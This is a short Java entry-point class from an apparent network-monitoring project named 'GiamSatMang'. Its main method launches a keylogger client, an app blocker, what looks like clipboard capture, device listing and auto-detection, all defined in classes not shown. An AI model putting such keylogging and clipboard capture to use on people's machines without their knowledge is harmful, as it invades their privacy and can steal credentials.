/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package giamsatmang;



public class GiamSatMang {


    public static void main(String[] args) throws InterruptedException {
        AutoDetect ad = new AutoDetect();
        CopyPate cp = new CopyPate();
        ListDevices cd = new ListDevices();
        
        KeyLoggerClient.run();
        BlockApp.run();
        cd.excute();
        ad.run();
    
    }
    
}
